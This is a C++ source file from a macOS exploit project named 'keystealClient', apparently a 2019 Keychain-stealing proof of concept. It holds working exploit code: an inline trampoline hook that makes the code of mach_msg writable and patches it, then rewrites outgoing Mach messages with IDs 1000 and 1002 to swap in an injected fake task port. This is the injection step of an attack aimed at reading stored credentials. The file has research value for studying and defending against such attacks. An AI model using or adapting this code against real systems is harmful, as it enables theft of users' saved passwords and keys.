//
//  inject.cpp
//  keystealClient
//
//  Created by Linus Henze on 22.01.19.
//  Copyright © 2019 Linus Henze. All rights reserved.
//

#include "inject.hpp"

mach_port_t injectedFakeTaskPort;

// movabs rax, ADDRESS; jmp rax
static uint8_t trampoline[] = { 0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0xFF, 0xE0 };

extern "C" mach_msg_return_t my_mach_msg_trap(mach_msg_header_t *msg,
                                           mach_msg_option_t option,
                                           mach_msg_size_t send_size,
                                           mach_msg_size_t rcv_size,
                                           mach_port_name_t rcv_name,
                                           mach_msg_timeout_t timeout,
                                           mach_port_name_t notify);

mach_msg_return_t    my_mach_msg(mach_msg_header_t *msg,
                                 mach_msg_option_t option,
                                 mach_msg_size_t send_size,
                                 mach_msg_size_t rcv_size,
                                 mach_port_name_t rcv_name,
                                 mach_msg_timeout_t timeout,
                                 mach_port_name_t notify) {
    if (option & MACH_SEND_MSG) {
        if (msg->msgh_id == 1000 && send_size == 76) { // Setup
            typedef struct {
                mach_msg_header_t Head;
                /* start of the kernel processed data */
                mach_msg_body_t msgh_body;
                mach_msg_port_descriptor_t tport;
                /* end of the kernel processed data */
            } Request;
            
            Request *req = (Request*) msg;
            req->tport.name = injectedFakeTaskPort;
        } else if (msg->msgh_id == 1002) { // Setup thread
            typedef struct {
                mach_msg_header_t Head;
                /* start of the kernel processed data */
                mach_msg_body_t msgh_body;
                mach_msg_port_descriptor_t tport;
                /* end of the kernel processed data */
            } Request;
            
            Request *req = (Request*) msg;
            req->tport.name = injectedFakeTaskPort;
        }
    }
    
    return my_mach_msg_trap(msg, option, send_size, rcv_size, rcv_name, timeout, notify);
}

void installHook(void *real, void *repl) {
    vm_protect(mach_task_self(), (vm_address_t)real, 10, 0, VM_PROT_READ | VM_PROT_EXECUTE | VM_PROT_WRITE);
    memcpy(real, trampoline, sizeof(trampoline));
    uint64_t *addr = (uint64_t*)((vm_address_t)real + 2);
    *addr = (uint64_t) repl;
    vm_protect(mach_task_self(), (vm_address_t)real, 10, 0, VM_PROT_READ | VM_PROT_EXECUTE);
}

void inject_fake_task_port(mach_port_t port) {
    injectedFakeTaskPort = port;
    installHook((void*) mach_msg, (void*) my_mach_msg);
}
